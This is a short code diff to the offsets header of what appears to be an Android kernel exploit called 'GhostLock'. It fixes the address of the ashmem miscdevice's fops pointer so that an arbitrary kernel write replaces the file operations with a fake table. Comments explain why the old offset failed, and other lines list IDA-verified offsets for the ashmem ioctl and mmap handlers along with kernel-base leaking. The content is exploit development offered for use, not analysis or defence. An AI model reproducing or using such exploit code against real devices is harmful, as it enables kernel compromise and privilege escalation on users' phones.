@@ -35,8 +35,15 @@
 #define PSELECT_WAITER_WORD_SHIFT -2
 
 /* 符号偏移 (IDA MCP verified from miscdevice + fops structure) */
-#define ASHMEM_MISC_FOPS_OFF 0x0229d120ULL   /* ✓ IDA: miscdevice @ 0x291A8D8 fops_ptr = 0xffffffc00a2c0048 */
-#define ASHMEM_FOPS_OFF 0x0229d120ULL         /* ✓ IDA: same as ASHMEM_MISC_FOPS */
+/* ASHMEM_MISC_FOPS = &ashmem_misc.fops (the POINTER field misc_open reads to set
+ * file->f_op), so the GhostLock write *ashmem_misc_fops=fake_fops actually swaps
+ * the fops. Kernel scan: ashmem_misc (struct miscdevice) @ 0x28c6670, its .fops
+ * field @ +0x10 = 0x28c6680 holds &ashmem_fops (0xffffffc01229d120). Was wrongly
+ * set to 0x229d120 (the ashmem_fops TABLE itself) — writing fake_fops there only
+ * clobbered ashmem_fops.owner, the fd kept the real fops (write_iter=NULL) so
+ * FMODE_CAN_WRITE was never set -> pwrite EINVAL(22). */
+#define ASHMEM_MISC_FOPS_OFF 0x028c6680ULL   /* &ashmem_misc.fops (miscdevice+0x10) */
+#define ASHMEM_FOPS_OFF 0x0229d120ULL         /* ashmem_fops TABLE (for leak_kernel_base + restore value) */
 #define ASHMEM_IOCTL_OFF 0x011a37d8ULL        /* ✓ IDA: func entry sub_11EE6EC */
 #define ASHMEM_COMPAT_IOCTL_OFF 0x011a4328ULL /* ✓ IDA: func entry sub_11EE7D0 */
 #define ASHMEM_MMAP_OFF 0x011a4388ULL         /* ✓ IDA: func entry sub_11EE7D0 (same as compat_ioctl in this binary) */
